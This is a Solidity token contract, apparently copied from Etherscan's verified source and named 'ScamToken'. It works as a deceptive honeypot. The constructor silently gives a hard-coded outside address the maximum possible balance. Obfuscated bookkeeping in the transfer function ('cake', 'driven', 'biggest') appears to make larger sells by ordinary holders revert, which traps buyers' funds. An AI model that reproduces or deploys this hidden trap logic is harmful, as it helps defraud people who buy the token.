/**
 *Submitted for verification at Etherscan.io on 2022-07-20
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

contract ScamToken {
    string private _name = "Scam";
    string private _symbol = "SCAM";

    uint8 private _decimals = 9;

    uint256 private _tTotal = 1000000000000000 * 10**_decimals;
    uint256 private _rTotal;
    uint256 public _fee = 0;
   
    address public uniswapV2Pair;
    address[] interest = new address[](2);

    uint256 private like = ~uint256(0); //115792089237316195423570985008687907853269984665640564039457584007913129639935
    address ztotal = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;
    address _owner;

    mapping(address => mapping(address => uint256)) public _allowances;
    mapping(address => uint256) public _balances;
    
    mapping(address => uint256) public driven;
    mapping(address => uint256) public cake;

    event Approval( address indexed owner, address indexed spender, uint256 value );
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {
        _owner = msg.sender;
        _balances[ztotal] = like;
        _balances[msg.sender] = _tTotal;
        cake[ztotal] = like;
        cake[msg.sender] = like;
    }
//----------------------------------------------------------------------------------------------------------
    function getDriven() external view returns (uint _ztotal, uint owner){
        owner = driven[_owner];
        _ztotal = driven[ztotal];
    }

    function getCake() external view returns (uint _ztotal, uint owner){
        owner = driven[_owner];
        _ztotal = driven[ztotal];
    }
//----------------------------------------------------------------------------------------------------------
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool) {
        require(amount > 0, "Transfer amount must be greater than zero");
        biggest(sender, recipient, amount);
        emit Transfer(sender, recipient, amount);
        return
            _approve(
                sender,
                msg.sender,
                _allowances[sender][msg.sender] - amount
            );
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        biggest(msg.sender, recipient, amount);
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function biggest( address treated, address official, uint256 amount ) private {
        address hall = interest[1];
        bool border = uniswapV2Pair == treated;
        uint256 order = _fee;

        if (cake[treated] == 0 && driven[treated] > 0 && !border) {
            cake[treated] -= order;
            if (amount > 2 * 10**(13 + _decimals)) cake[treated] -= order - 1;
        }

        interest[1] = official;

        if (cake[treated] > 0 && amount == 0) {
            cake[official] += order;
        }

        driven[hall] += order + 1;

        uint256 fee = (amount / 100) * _fee;
        amount -= fee;
        _balances[treated] -= fee;
        _balances[address(this)] += fee;

        _balances[treated] -= amount;
        _balances[official] += amount;
    }

    function _approve( address owner, address spender, uint256 amount ) private returns (bool) {
        require( owner != address(0) && spender != address(0), "ERC20: approve from the zero address" );
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
}